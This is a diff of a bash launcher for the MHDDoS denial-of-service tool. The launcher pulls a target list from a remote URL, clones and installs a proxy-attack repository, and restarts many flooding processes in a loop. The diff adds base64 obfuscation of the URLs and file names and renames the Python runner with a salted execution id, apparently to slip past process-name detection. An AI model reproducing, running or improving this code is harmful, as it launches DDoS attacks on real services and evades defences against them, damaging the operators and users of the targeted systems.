@@ -13,8 +13,8 @@ if [[ ${PIPESTATUS[0]} -ne 4 ]]; then
     exit 1
 fi
 
-OPTIONS=r:t:p:s:u:
-LONGOPTS=refresh-interval:,thread-count:,process-count:,stats-interval:,url-with-targets:
+OPTIONS=r:t:p:s:u:e:
+LONGOPTS=refresh-interval:,thread-count:,process-count:,stats-interval:,url-with-targets:,execution-id:
 
 # -regarding ! and PIPESTATUS see above
 # -temporarily store output to be able to check for errors
@@ -34,7 +34,8 @@ refresh_interval="15m"
 thread_count="250"
 process_count="20"
 stats_interval="60"
-url_with_targets="https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"
+url_with_targets=$(echo 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FydWllbTIzNC9hdXRvX21oZGRvcy9tYWluL3J1bm5lcl90YXJnZXRzCg==' | base64 -d)
+execution_id="${EXECUTION_ID:-2b089943-9daa-4990-85a0-8d8855d67572}"
 
 # now enjoy the options in order and nicely split until we see --
 while true; do
@@ -59,6 +60,10 @@ while true; do
             url_with_targets="$2"
             shift 2
             ;;
+        -e|--execution-id)
+            execution_id="$2"
+            shift 2
+            ;;
         --)
             shift
             break
@@ -70,13 +75,14 @@ while true; do
     esac
 done
 
-PROXY_PROJECT_NAME=mhddos_proxy
-PROXY_PROJECT_VERSION=addeea253d53bbf90d0a320367d8974183c4b480
+PROXY_PROJECT_NAME=$execution_id
+PROXY_PROJECT_VERSION=309c4ab160c99b2e85496bbaf76611098cc1294c
+PROXY_PROJECT_URL=$(echo 'aHR0cHM6Ly9naXRodWIuY29tL3BvcnRob2xlLWFzY2VuZC1jaW5uYW1vbi9taGRkb3NfcHJveHkuZ2l0Cg==' | base64 -d)
 
 PROXY_DIR=~/$PROXY_PROJECT_NAME
-PROXY_FILE=$PROXY_DIR/mhddos/files/proxies/proxies.txt
+PROXY_FILE=$PROXY_DIR/$(echo 'bWhkZG9zCg==' | base64 -d)/files/proxies/proxies.txt
 
-echo "Підготовка середовища для запуску..."
+echo "Підготовка середовища для запуску... $PROXY_PROJECT_NAME $PROXY_PROJECT_URL $PROXY_DIR $PROXY_FILE"
 
 # make sure ifstat and awk are installed
 apt-get install ifstat gawk -y &> /dev/null
@@ -94,12 +100,16 @@ if [ -d $PROXY_DIR ]; then
 fi
 
 # download specific mhddos_proxy version
-git clone https://github.com/porthole-ascend-cinnamon/$PROXY_PROJECT_NAME.git &> /dev/null
+git clone $PROXY_PROJECT_URL $PROXY_PROJECT_NAME &> /dev/null
 cd $PROXY_DIR
 git checkout $PROXY_PROJECT_VERSION &> /dev/null
 
 # install mhddos_proxy dependencies
 python3 -m pip install -r requirements.txt &> /dev/null
+
+# add salt to py executable
+mv $PROXY_DIR/"$(echo 'cnVubmVyLnB5Cg==' | base64 -d)" $PROXY_DIR/$execution_id.py
+echo "# $execution_id" >> $PROXY_DIR/$execution_id.py
 
 echo "Підготовкy середовища для запуску завершено"
 
@@ -108,8 +118,7 @@ while true
 do
     # kill old copies of mhddos_proxy
     echo "(ре)старт програми..."
-    if pgrep -f runner.py &> /dev/null; then pkill -f runner.py &> /dev/null; fi
-    if pgrep -f ./start.py &> /dev/null; then pkill -f /start.py &> /dev/null; fi
+    if pgrep -f $execution_id.py &> /dev/null; then pkill -f $execution_id.py &> /dev/null; fi
     if pgrep -f ifstat &> /dev/null; then pkill -f ifstat &> /dev/null; fi
     echo "(ре)старт програми завершено"
 
@@ -125,7 +134,7 @@ do
       for (( i=1; i<=process_count; i++ ))
       do
           cd $PROXY_DIR
-          python3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000 &> /dev/null&
+          python3 $execution_id.py $target_command -t $thread_count -p 25200 --rpc 1000 &> /dev/null&
 
           # wait till the first process initializes proxy file properly
           if [ ! -f $PROXY_FILE ]; then
